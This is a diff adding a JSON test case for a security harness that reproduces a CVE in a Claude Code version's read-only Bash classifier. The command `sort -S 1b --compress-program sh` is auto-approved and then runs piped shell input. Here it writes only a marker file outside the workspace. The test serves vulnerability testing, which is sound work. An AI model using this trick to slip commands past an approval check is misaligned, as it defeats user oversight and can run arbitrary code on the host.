@@ -1,0 +1,40 @@
+{
+  "schema_version": 1,
+  "id": "claude-66032-sort-compress-vulnerable",
+  "description": "CVE-2025-66032 sort --compress-program chain의 known-vulnerable case다. Claude Code 1.0.92의 read-only Bash classifier가 `sort -S 1b --compress-program sh`를 auto-approve해 attacker-controlled stdin이 sh로 실행되는지 확인한다.",
+  "safety": {
+    "host_safe": false,
+    "network": "outer-isolation-required"
+  },
+  "target": {
+    "required": true,
+    "product": "@anthropic-ai/claude-code",
+    "version": "1.0.92",
+    "allowed_sha256": [
+      "a3669a7f28f6445f2739a20db9be773540228a521b6ca34e2f93d98b4b054599"
+    ]
+  },
+  "execution": {
+    "argv": [
+      "${PYTHON}",
+      "${REPO_ROOT}/harness/fixtures/claude-66032/run_with_mock.py",
+      "--cli-js",
+      "${TARGET}",
+      "--command",
+      "echo 'touch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker\ntouch ${OUTSIDE}/sort-marker' | sort -S 1b --compress-program sh",
+      "--result-out",
+      "${OUTSIDE}/claude-result.json",
+      "--timeout-seconds",
+      "35"
+    ],
+    "cwd": "workspace",
+    "timeout_seconds": 45,
+    "environment": {}
+  },
+  "expectations": {
+    "created": ["outside/sort-marker"],
+    "absent": [],
+    "unchanged": [],
+    "contents": {}
+  }
+}
